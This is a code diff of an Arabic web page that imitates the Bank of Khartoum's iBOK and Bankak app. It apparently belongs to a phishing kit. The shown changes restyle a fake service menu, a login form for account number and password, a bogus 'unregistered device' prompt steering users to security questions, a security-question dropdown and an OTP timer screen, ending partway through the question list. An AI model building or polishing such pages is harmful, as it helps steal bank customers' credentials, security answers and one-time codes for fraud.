@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>iBOK - الاستمارة أونلاين وتطبيق بنكك</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
   <style>
     * {
       box-sizing: border-box;
@@ -13,111 +13,84 @@
       font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
 
-    html, body {
-      width: 100vw;
-      height: 100vh;
-      background-color: #ffffff;
-      overflow: hidden;
-    }
-
     body {
+      background-color: #ffffff;
       display: flex;
       justify-content: center;
       align-items: center;
+      min-height: 100vh;
     }
 
     .app-screen {
-      width: 100vw;
+      width: 100%;
+      max-width: 412px;
       height: 100vh;
-      max-width: 100%;
-      max-height: 100%;
-      background-color: #f8fafc;
+      max-height: 870px;
+      background-color: #ffffff;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
       position: relative;
-      box-shadow: none;
-      border-radius: 0;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15);
+      border-radius: 16px;
+      border: 3px solid #ffffff;
       overflow: hidden;
     }
 
+    /* Screen Management */
     .screen {
       display: none;
       flex-direction: column;
       height: 100%;
       width: 100%;
       overflow-y: auto;
-      background-color: #f8fafc;
     }
 
     .screen.active {
       display: flex;
     }
 
-    /* رأس الصفحة المطابق للصورة تماماً */
-    .ibok-top-banner {
-      background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
-      padding: 16px 16px 20px;
+    /* Web Portal Header (iBOK Header) */
+    .ibok-header {
+      min-height: 80px;
+      background: linear-gradient(to right, #c62828, #e53935, #d32f2f);
       display: flex;
-      flex-direction: column;
       align-items: center;
-      justify-content: center;
-      position: relative;
-      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.25);
-      border-bottom-left-radius: 20px;
-      border-bottom-right-radius: 20px;
+      justify-content: space-between;
+      padding: 12px 16px;
+      color: white;
+      border-bottom: 3px solid rgba(255,255,255,0.4);
     }
 
-    .ibok-logo-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      color: #ffffff;
-      margin-bottom: 10px;
+    .welcome-box {
+      background-color: #ebb811;
+      color: #333;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 11px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
       text-align: center;
     }
 
-    .ibok-logo-ar {
-      font-size: 1.2rem;
-      font-weight: 800;
-      letter-spacing: 0.5px;
+    .header-logo {
+      text-align: left;
+      line-height: 1.1;
     }
 
-    .ibok-logo-en {
-      font-size: 0.7rem;
-      font-weight: 600;
-      opacity: 0.9;
-      letter-spacing: 0.5px;
-    }
+    .header-logo .title { font-size: 22px; font-weight: 800; display: block; }
+    .header-logo .subtitle { font-size: 11px; opacity: 0.9; }
 
-    .yellow-action-badge {
-      background: linear-gradient(180deg, #ffd700 0%, #facc15 100%);
-      color: #99080e;
-      padding: 8px 24px;
-      border-radius: 30px;
-      font-weight: 900;
-      font-size: 0.92rem;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-      border: 1px solid #fef08a;
-      text-align: center;
-      cursor: pointer;
-      transition: transform 0.2s ease;
-    }
-
-    .yellow-action-badge:hover {
-      transform: scale(1.02);
-    }
-
+    /* Red App Header */
     .top-header {
-      background: linear-gradient(180deg, #e10a14 0%, #a5080e 100%);
-      padding: 18px 16px;
+      background: linear-gradient(180deg, #e10a14 0%, #b80c13 100%);
+      padding: 20px 16px;
       width: 100%;
       position: relative;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 4px 10px rgba(225, 10, 20, 0.2);
     }
 
     .header-bar {
@@ -125,71 +98,60 @@
       justify-content: space-between;
       align-items: center;
       width: 100%;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
     }
 
     .page-title {
       color: #ffffff;
-      font-size: 1.15rem;
-      font-weight: 800;
+      font-size: 1.1rem;
+      font-weight: bold;
     }
 
     .btn-top-back {
       background-color: #ffffff;
       color: #e10a14;
-      border: none;
-      border-radius: 8px;
-      padding: 5px 12px;
-      font-size: 0.8rem;
+      border: 1px solid #ffffff;
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: 0.78rem;
       font-weight: 700;
       cursor: pointer;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.15);
-      transition: all 0.2s;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      transition: background 0.2s;
     }
 
     .btn-top-back:hover {
-      background-color: #f8fafc;
-      transform: translateY(-1px);
+      background-color: #f3f4f6;
     }
 
+    /* Logo Styling */
     .logo-box {
       text-align: center;
       color: #ffffff;
       user-select: none;
     }
 
-    .logo-ar { font-size: 2.6rem; font-weight: 900; line-height: 1; }
+    .logo-ar { font-size: 2.8rem; font-weight: 900; line-height: 1; }
     .logo-ar span { color: #f59e0b; }
-    .logo-en { font-size: 1.5rem; font-weight: 800; line-height: 1; margin-top: -2px; }
+    .logo-en { font-size: 1.6rem; font-weight: 800; line-height: 1; margin-top: -4px; }
     .logo-en span { color: #f59e0b; }
 
+    /* Service Grid Styling */
     .portal-section {
-      padding: 14px 16px;
+      padding: 16px;
       flex: 1;
       text-align: center;
       background: #f8fafc;
     }
 
-    .portal-main-title {
-      color: #99080e;
-      font-size: 1.1rem;
-      font-weight: 900;
-      margin-bottom: 4px;
-      line-height: 1.3;
-    }
-
-    .portal-subtitle {
-      color: #64748b;
-      font-size: 0.8rem;
-      font-weight: 600;
-      margin-bottom: 12px;
-    }
+    .portal-section h2 { color: #d32f2f; margin-bottom: 6px; font-size: 18px; font-weight: 800; }
+    .portal-section h3 { color: #555; margin-bottom: 16px; font-size: 13px; border-bottom: 2px solid #e2e8f0; display: inline-block; padding-bottom: 4px; }
 
     .service-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      margin-bottom: 12px;
+      display: grid;
+      grid-template-columns: repeat(1, 1fr);
+      gap: 12px;
+      margin-bottom: 16px;
       text-align: right;
     }
 
@@ -198,65 +160,34 @@
       flex-direction: row;
       align-items: center;
       justify-content: space-between;
-      padding: 10px 14px;
-      border: 1px solid #f1f5f9;
-      border-radius: 12px;
+      padding: 16px 18px;
+      border: 2px solid #cbd5e1;
+      border-radius: 14px;
       cursor: pointer;
       background-color: #ffffff;
-      transition: all 0.25s ease;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
     }
 
     .service-option:hover {
-      border-color: #cbd5e1;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+      border-color: #94a3b8;
     }
 
     .service-option.selected {
-      border-color: #e10a14;
-      background-color: #fff5f5;
-      box-shadow: 0 3px 10px rgba(225, 10, 20, 0.1);
+      border: 2px solid #d32f2f;
+      background-color: rgba(211, 47, 47, 0.05);
+      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.1);
     }
 
-    .service-content {
-      display: flex;
-      flex-direction: column;
-      text-align: right;
-      flex: 1;
-    }
+    .service-content { display: flex; flex-direction: column; text-align: right; }
+    .service-title { font-weight: 700; color: #d32f2f; font-size: 15px; }
+    .service-desc { font-size: 12px; color: #555; margin-top: 3px; }
+    .service-icon { font-size: 1.5rem; margin-left: 10px; }
 
-    .service-title {
-      font-weight: 800;
-      color: #d32f2f;
-      font-size: 0.92rem;
-    }
-
-    .service-desc {
-      font-size: 0.74rem;
-      color: #64748b;
-      margin-top: 1px;
-      font-weight: 600;
-    }
-
-    .service-icon-box {
-      width: 34px;
-      height: 34px;
-      background-color: #fff5f5;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #d32f2f;
-      font-size: 1rem;
-      margin-left: 10px;
-      flex-shrink: 0;
-      box-shadow: 0 2px 4px rgba(211, 47, 47, 0.1);
-    }
-
+    /* Form Components */
     .form-section {
-      padding: 20px 20px;
+      padding: 20px;
       flex: 1;
-      background-color: #ffffff;
     }
 
     .input-box {
@@ -264,224 +195,159 @@
       margin-bottom: 14px;
     }
 
-    .input-field, select.input-field {
+    .input-field {
       width: 100%;
-      padding: 12px 42px 12px 14px;
-      border: 1.5px solid #cbd5e1;
-      border-radius: 10px;
+      padding: 12px 40px 12px 12px;
+      border: 2px solid #cbd5e1;
+      border-radius: 8px;
       font-size: 0.9rem;
       outline: none;
-      color: #0f172a;
+      color: #111827;
       background: #ffffff;
-      transition: border-color 0.2s, box-shadow 0.2s;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
     }
 
-    .input-field:focus { 
-      border-color: #e10a14; 
-      box-shadow: 0 0 0 3px rgba(225, 10, 20, 0.1);
+    .input-field:focus { border-color: #d32f2f; }
+
+    select.input-field {
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236b7280' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: left 12px center;
+      background-size: 16px;
+      padding-left: 36px;
     }
 
     .icon-right {
       position: absolute;
-      right: 14px;
+      right: 12px;
       top: 50%;
       transform: translateY(-50%);
-      color: #64748b;
-      font-size: 1.1rem;
+      color: #6b7280;
     }
 
     .toggle-eye {
       position: absolute;
-      right: 14px;
+      right: 12px;
       top: 50%;
       transform: translateY(-50%);
-      color: #64748b;
+      color: #6b7280;
       cursor: pointer;
       user-select: none;
       z-index: 5;
-      font-size: 1.1rem;
     }
 
+    /* Red Glossy Buttons */
     .btn-red {
       width: 100%;
-      padding: 13px;
+      padding: 11px;
       background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
-      border: 1px solid #99080e;
-      border-radius: 10px;
+      border: 1px solid #990a10;
+      border-radius: 8px;
       color: #ffffff;
-      font-size: 1.05rem;
-      font-weight: 800;
+      font-size: 1rem;
+      font-weight: 700;
       cursor: pointer;
-      box-shadow: 0 4px 12px rgba(225, 10, 20, 0.25);
-      transition: all 0.2s;
-      margin-bottom: 10px;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), 0 3px 6px rgba(0,0,0,0.15);
+      margin-bottom: 8px;
       text-align: center;
     }
 
-    .btn-red:hover {
-      opacity: 0.95;
-      transform: translateY(-1px);
-      box-shadow: 0 6px 15px rgba(225, 10, 20, 0.35);
-    }
-
-    .btn-whatsapp {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      width: 100%;
-      padding: 13px;
-      background: #25d366;
-      border: 1px solid #1ebe57;
-      border-radius: 10px;
-      color: #ffffff;
-      font-size: 1.05rem;
-      font-weight: 800;
-      cursor: pointer;
-      text-decoration: none;
-      box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
-      transition: all 0.2s;
-      margin-bottom: 10px;
-    }
-
-    .btn-whatsapp:hover {
-      opacity: 0.95;
-      transform: translateY(-1px);
-    }
-
-    .btn-group { display: flex; gap: 10px; margin-top: 12px; }
+    .btn-group { display: flex; gap: 10px; margin-top: 10px; }
     .btn-group .btn-red { flex: 1; }
 
+    /* Modal Overlay */
     .modal-overlay {
       display: none;
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(15, 23, 42, 0.65);
-      backdrop-filter: blur(4px);
+      background: rgba(0, 0, 0, 0.6);
       align-items: center;
       justify-content: center;
       padding: 20px;
       z-index: 100;
-      animation: fadeIn 0.2s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
     }
 
     .modal-box {
       background: #ffffff;
-      border-radius: 16px;
+      border: 1px solid #cbd5e1;
+      border-radius: 12px;
       overflow: hidden;
       width: 100%;
       max-width: 340px;
-      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
       text-align: center;
-      animation: scaleUp 0.25s ease;
-    }
-
-    @keyframes scaleUp {
-      from { transform: scale(0.9); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
     }
 
     .modal-header {
       background: #e10a14;
       color: #ffffff;
-      padding: 14px 16px;
-      font-weight: 800;
-      font-size: 1.1rem;
+      padding: 10px 16px;
+      font-weight: bold;
+      font-size: 1.05rem;
     }
 
     .modal-body {
       padding: 20px 16px;
-      color: #334155;
-      font-size: 0.92rem;
-      line-height: 1.6;
-      font-weight: 600;
+      color: #374151;
+      font-size: 0.9rem;
+      line-height: 1.5;
     }
 
     .modal-actions {
-      padding: 0 16px 20px;
+      padding: 0 16px 16px;
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 6px;
       justify-content: center;
     }
 
     .btn-retry {
       width: 100%;
-      padding: 11px 20px;
+      padding: 9px 20px;
       background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
-      border: 1px solid #99080e;
-      border-radius: 10px;
+      border: 1px solid #990a10;
+      border-radius: 8px;
       color: #ffffff;
       font-size: 0.95rem;
-      font-weight: 800;
+      font-weight: 700;
       cursor: pointer;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.15);
-      transition: all 0.2s;
     }
 
+    /* OTP Card Styling */
     .otp-card {
-      border: 1.5px solid #e2e8f0;
-      border-radius: 14px;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
       padding: 20px;
-      margin: 5px 0;
+      margin: 10px 0;
       text-align: center;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
       background: #fafafa;
     }
 
     .timer-circle {
-      width: 50px;
-      height: 50px;
-      border: 4px solid #10b981;
+      width: 48px;
+      height: 48px;
+      border: 3px solid #10b981;
       border-top-color: transparent;
       border-radius: 50%;
-      margin: 0 auto 12px;
-      animation: spin 1.5s linear infinite;
+      margin: 0 auto 10px;
+      animation: spin 2s linear infinite;
     }
 
     @keyframes spin { 100% { transform: rotate(360deg); } }
 
     .timer-text {
-      font-size: 1.15rem;
-      font-weight: 900;
-      color: #0f172a;
-      margin-bottom: 6px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      color: #111827;
+      margin-bottom: 8px;
     }
 
-    .otp-info { font-size: 0.85rem; color: #64748b; margin-bottom: 16px; font-weight: 600; }
-    .resend-link { font-size: 0.85rem; color: #0284c7; text-decoration: none; font-weight: 700; display: inline-block; margin-bottom: 14px; }
-    .resend-link:hover { text-decoration: underline; }
+    .otp-info { font-size: 0.82rem; color: #6b7280; margin-bottom: 16px; }
+    .resend-link { font-size: 0.8rem; color: #6b7280; text-decoration: underline; cursor: pointer; display: inline-block; margin-bottom: 12px; }
 
-    .dots-loading-container {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 7px;
-      margin-bottom: 14px;
-    }
-
-    .dot {
-      width: 10px;
-      height: 10px;
-      background-color: #e10a14;
-      border-radius: 50%;
-      animation: bounceDot 1.4s infinite ease-in-out both;
-    }
-
-    .dot:nth-child(1) { animation-delay: -0.32s; }
-    .dot:nth-child(2) { animation-delay: -0.16s; }
-    .dot:nth-child(3) { animation-delay: 0s; }
-
-    @keyframes bounceDot {
-      0%, 80%, 100% { transform: scale(0); opacity: 0.3; }
-      40% { transform: scale(1.0); opacity: 1; }
-    }
-
+    /* Loading Overlay Screen & Contact Details */
     .loading-screen {
       display: flex;
       flex-direction: column;
@@ -495,46 +361,46 @@
     }
 
     .loading-spinner {
-      width: 60px;
-      height: 60px;
-      border: 5px solid #f1f5f9;
+      width: 56px;
+      height: 56px;
+      border: 5px solid #f3f4f6;
       border-top: 5px solid #e10a14;
       border-radius: 50%;
       animation: spin 1s linear infinite;
       margin-bottom: 16px;
     }
 
-    .loading-title { font-size: 1.25rem; font-weight: 900; color: #0f172a; margin-bottom: 6px; }
-    .loading-subtitle { font-size: 0.9rem; color: #dc2626; font-weight: 700; margin-bottom: 24px; }
+    .loading-title { font-size: 1.2rem; font-weight: 800; color: #111827; margin-bottom: 6px; }
+    .loading-subtitle { font-size: 0.88rem; color: #dc2626; font-weight: 600; margin-bottom: 24px; }
 
     .contact-card {
       width: 100%;
       background: #f8fafc;
-      border: 1.5px solid #e2e8f0;
-      border-radius: 14px;
-      padding: 18px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
-      margin-top: 15px;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 16px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.03);
     }
 
-    .contact-title { font-size: 0.82rem; color: #475569; margin-bottom: 8px; font-weight: 700; }
-    .contact-number { font-size: 1.4rem; font-weight: 900; color: #e10a14; letter-spacing: 1px; margin-bottom: 6px; display: flex; align-items: center; justify-content: center; gap: 6px; }
-    .whatsapp-info { font-size: 0.8rem; color: #16a34a; font-weight: 800; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; padding-top: 6px; border-top: 1px dashed #cbd5e1; }
-    .email-info { font-size: 0.82rem; color: #0284c7; font-weight: 800; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; padding-top: 6px; border-top: 1px dashed #cbd5e1; }
+    .contact-title { font-size: 0.85rem; color: #475569; margin-bottom: 10px; }
+    .contact-number { font-size: 1.8rem; font-weight: 900; color: #e10a14; letter-spacing: 2px; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .whatsapp-info { font-size: 0.82rem; color: #16a34a; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; padding-top: 8px; border-top: 1px dashed #cbd5e1; }
+    .email-info { font-size: 0.85rem; color: #0284c7; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 8px; padding-top: 8px; border-top: 1px dashed #cbd5e1; }
     .email-info a { color: inherit; text-decoration: none; }
     .email-info a:hover { text-decoration: underline; }
 
+    /* Bottom Navigation Bar */
     .bottom-nav {
       display: flex;
       justify-content: space-around;
       align-items: center;
-      padding: 12px 10px 16px;
+      padding: 10px 10px 16px;
       background-color: #ffffff;
-      border-top: 1px solid #f1f5f9;
+      border-top: 1px solid #e5e7eb;
     }
 
-    .nav-link { display: flex; flex-direction: column; align-items: center; gap: 4px; text-decoration: none; color: #94a3b8; font-size: 0.72rem; font-weight: 700; }
-    .icon-circle { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ffffff; font-size: 0.95rem; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    .nav-link { display: flex; flex-direction: column; align-items: center; gap: 4px; text-decoration: none; color: #9ca3af; font-size: 0.72rem; }
+    .icon-circle { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ffffff; font-size: 0.95rem; }
     .icon-fb { background-color: #3b5998; }
     .icon-help { background-color: #8cc63f; }
     .icon-location { background-color: #e10a14; }
@@ -545,81 +411,74 @@
 
   <div class="app-screen">
 
-    <!-- 1. شاشة اختيار الخدمات (المطابقة للصورة تماماً) -->
+    <!-- 1. شاشة اختيار الخدمات -->
     <div class="screen active" id="screenServices">
-      <div class="ibok-top-banner">
-        <div class="ibok-logo-container">
-          <span class="ibok-logo-ar">الخدمات المصرفية عبر الإنترنت | iBOK</span>
-          <span class="ibok-logo-en">Internet Banking Services</span>
+      <header class="ibok-header">
+        <div class="welcome-box">iBOK الخدمة المصرفية</div>
+        <div class="header-logo">
+          <span class="title">iBOK</span>
+          <span class="subtitle">الاستمارة أونلاين</span>
         </div>
-        <div class="yellow-action-badge" onclick="selectService(1, 'رفع سقف التحويلات اليومي')">
-          خدمات بنكك أونلاين
-        </div>
-      </div>
+      </header>
 
       <div class="portal-section">
-        <div class="portal-main-title">Bankak Online | مرحباً بكم في خدمات بنكك أونلاين</div>
-        <div class="portal-subtitle">الرجاء الاختيار من الخدمات المقدمة أدناه</div>
+        <h2>الاستمارة أونلاين</h2>
+        <h3>اختر نوع الخدمة التي ترغب بمعالجتها</h3>
 
         <div class="service-grid">
-          <div class="service-option" onclick="selectService(1, 'رفع سقف التحويلات اليومي')">
-            <div class="service-content">
-              <span class="service-title">رفع سقف التحويلات اليومي</span>
-              <span class="service-desc">زيادة الحد اليومي للتحويلات.</span>
-            </div>
-            <div class="service-icon-box">⏱️</div>
-          </div>
-          <div class="service-option" onclick="selectService(2, 'التحويلات الخاطئة')">
+          <div class="service-option selected" onclick="selectService(1, 'التحويلات الخاطئة')">
             <div class="service-content">
               <span class="service-title">التحويلات الخاطئة</span>
               <span class="service-desc">معالجة أخطاء التحويلات البنكية.</span>
             </div>
-            <div class="service-icon-box">🔄</div>
+            <span class="service-icon">🔄</span>
           </div>
-          <div class="service-option" onclick="selectService(3, 'خدمات العملات الأجنبية')">
+          <div class="service-option" onclick="selectService(2, 'خدمات العملات الأجنبية')">
             <div class="service-content">
               <span class="service-title">خدمات العملات الأجنبية</span>
               <span class="service-desc">تفعيل وإدارة العملات الأجنبية.</span>
             </div>
-            <div class="service-icon-box">🌐</div>
+            <span class="service-icon">🌐</span>
           </div>
-          <div class="service-option" onclick="selectService(4, 'كشف الحساب')">
+          <div class="service-option" onclick="selectService(3, 'كشف الحساب')">
             <div class="service-content">
               <span class="service-title">كشف الحساب</span>
               <span class="service-desc">الحصول على كشف حساب مفصل.</span>
             </div>
-            <div class="service-icon-box">📄</div>
+            <span class="service-icon">📄</span>
           </div>
-          <div class="service-option" onclick="selectService(5, 'بطاقة فيزا افتراضية')">
+          <div class="service-option" onclick="selectService(4, 'بطاقة فيزا افتراضية')">
             <div class="service-content">
               <span class="service-title">بطاقة فيزا افتراضية</span>
               <span class="service-desc">تفعيل بطاقة فيزا للاستخدام الإلكتروني.</span>
             </div>
-            <div class="service-icon-box">💳</div>
+            <span class="service-icon">💳</span>
           </div>
-          <div class="service-option" onclick="selectService(6, 'تغيير رقم الهاتف')">
-            <div class="service-content">
-              <span class="service-title">تغيير رقم الهاتف</span>
-              <span class="service-desc">تحديث رقم الهاتف المرتبط بالحساب.</span>
-            </div>
-            <div class="service-icon-box">📱</div>
-          </div>
-          <div class="service-option" onclick="selectService(7, 'حساب جاري و حساب مميز')">
+          <div class="service-option" onclick="selectService(5, 'حساب جاري و حساب مميز')">
             <div class="service-content">
               <span class="service-title">حساب جاري و حساب مميز</span>
               <span class="service-desc">فتح أو ترقية الحساب.</span>
             </div>
-            <div class="service-icon-box">🪪</div>
+            <span class="service-icon">🪪</span>
+          </div>
+          <div class="service-option" onclick="selectService(6, 'إدارة أسئلة الأمان')">
+            <div class="service-content">
+              <span class="service-title">إدارة أسئلة الأمان</span>
+              <span class="service-desc">تحديث أو إعادة تعيين أسئلة الأمان.</span>
+            </div>
+            <span class="service-icon">🔒</span>
           </div>
         </div>
+
+        <button class="btn-red" onclick="attemptTransition('screenLogin')">متابعة تسجيل الدخول ➔</button>
       </div>
     </div>
 
-    <!-- 2. شاشة تسجيل الدخول -->
+    <!-- 2. شاشة تسجيل الدخول (تطبيق بنكك) -->
     <div class="screen" id="screenLogin">
       <div class="top-header" style="height: 32%;">
         <div class="header-bar" style="width: 100%;">
-          <button type="button" class="btn-top-back" onclick="resetAppData()">← رجوع للرئيسية</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenServices')">← رجوع</button>
           <span></span>
         </div>
         <div class="logo-box">
@@ -629,23 +488,23 @@
       </div>
 
       <div class="form-section">
-        <form onsubmit="handleLoginSubmit(event)" id="loginFormElement">
+        <form onsubmit="handleLoginSubmit(event)">
           <div class="input-box">
             <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="userIdInput" placeholder="أدخل رقم الحساب (7 أرقام)" maxlength="7" autocomplete="off" />
+            <input type="text" class="input-field" id="userIdInput" placeholder="أدخل رقم الحساب (7 أرقام)" maxlength="7" />
           </div>
 
           <div class="input-box">
             <span class="toggle-eye" onclick="togglePasswordVisibility()">👁️</span>
-            <input type="password" class="input-field" id="passwordInput" placeholder="ادخل كلمة المرور" autocomplete="current-password" />
+            <input type="password" class="input-field" id="passwordInput" placeholder="ادخل كلمة المرور" />
           </div>
 
           <button type="submit" class="btn-red">تسجيل الدخول</button>
         </form>
 
-        <div style="display:flex; justify-content:space-between; margin-top: 18px; font-size: 0.85rem; color:#64748b; font-weight: 700;">
-          <span style="cursor: pointer;">تسجيل جديد؟</span>
-          <span style="cursor: pointer;">لاتستطيع تسجيل الدخول؟</span>
+        <div style="display:flex; justify-content:space-between; margin-top: 15px; font-size: 0.82rem; color:#888;">
+          <span>تسجيل جديد؟</span>
+          <span>لاتستطيع تسجيل الدخول؟</span>
         </div>
       </div>
 
@@ -657,32 +516,7 @@
       </div>
     </div>
 
-    <!-- شاشة جاري تسجيل الدخول -->
-    <div class="screen" id="screenLoginLoading">
-      <div class="top-header" style="height: 32%;">
-        <div class="header-bar" style="width: 100%;">
-          <span></span>
-          <span></span>
-        </div>
-        <div class="logo-box">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-          <div class="logo-en">ban<span>kak</span></div>
-        </div>
-      </div>
-
-      <div class="form-section" style="text-align: center; padding-top: 50px;">
-        <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
-          <div style="font-size: 1.15rem; font-weight: 800; color: #d32f2f;">جاري تسجيل الدخول...</div>
-          <div class="dots-loading-container" style="margin-bottom: 0;">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- نافذة خطأ الإدخال والتنبيهات -->
+    <!-- نافذة خطأ الإدخال / الحظر المنبثقة -->
     <div class="modal-overlay" id="modalError">
       <div class="modal-box">
         <div class="modal-header" id="modalHeaderTitle">خطأ</div>
@@ -695,57 +529,71 @@
       </div>
     </div>
 
-    <!-- 3. النافذة المنبثقة: الجهاز غير مسجل -->
+    <!-- 3. النافذة المنبثقة: موبايل مختلف -->
     <div class="modal-overlay" id="modalDevice">
       <div class="modal-box">
         <div class="modal-header">ترغب في الدخول إلي الخدمة المصرفية؟</div>
-        <div class="modal-body" style="font-size: 0.88rem;">
-          إذا كنت تحاول الدخول من حسابك لأول مرة اضغط على زر الاجابة على أسئلة الأمان واتبع التعليمات بدقة.
+        <div class="modal-body" style="font-size: 0.85rem;">
+          إذا كنت تحاول الدخول من حسابك لاول مرة اضغط على زر الاجابة على أسئلة الامان واتبع التعليمات.
         </div>
-        <div class="modal-actions" style="flex-direction: column; gap: 8px; width: 100%;">
+        <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
           <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
-          <button class="btn-red" onclick="closeModal('modalDevice')" style="background: #475569; border-color: #334155;">باستخدام بطاقة الصراف الآلي</button>
-          <button class="btn-red" style="background: #ef4444; border-color: #dc2626;" onclick="closeModal('modalDevice')">إلغاء</button>
+          <button class="btn-red" onclick="closeModal('modalDevice')">باستخدام بطاقة الصراف الآلي</button>
+          <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
         </div>
       </div>
     </div>
 
-    <!-- 4. شاشة أسئلة الأمان -->
+    <!-- 4. شاشة أسئلة الأمان المحدثة -->
     <div class="screen" id="screenQuestions">
-      <div class="top-header" style="padding: 14px 16px;">
+      <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
           <span class="page-title">أسئلة الأمان</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenLogin')">← رجوع</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenLogin')">← رجوع</button>
         </div>
-        <div class="logo-box" style="transform: scale(0.75);">
+        <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
         </div>
       </div>
 
       <div class="form-section">
-        <p style="font-size: 0.95rem; color: #1e293b; margin-bottom: 14px; font-weight: 800;" id="questionText">
-          ما هو اسم المدرسة التي التحقت بها؟
-        </p>
+        <div class="input-box">
+          <select class="input-field" id="securityQuestionSelect">
+            <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+            <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
+            <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
+            <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
+            <option value="ماذا كانت لقب أثنا الطفولة؟">ماذا كانت لقب أثنا الطفولة؟</option>
+            <option value="اسم موفلك المفضّل؟">اسم موفلك المفضّل؟</option>
+            <option value="اسم الشركة المصنعة للسيارة المفضلة لديك؟">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+            <option value="اي فلم هو المفضلة لديك؟">اي فلم هو المفضلة لديك؟</option>
+            <option value="اسم افضل صديق في الطفولة؟">اسم افضل صديق في الطفولة؟</option>
+            <option value="في أي عام حصلت على رخصة القيادة الخاصة بك؟">في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+            <option value="العلامة التجارية لأول تلفزيون الخاص بك؟">العلامة التجارية لأول تلفزيون الخاص بك؟</option>
+            <option value="في أي سنة تزوجت؟">في أي سنة تزوجت؟</option>
+            <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
+            <option value="ماهو اسم المدرسة التي التحقت بها؟">ماهو اسم المدرسة التي التحقت بها؟</option>
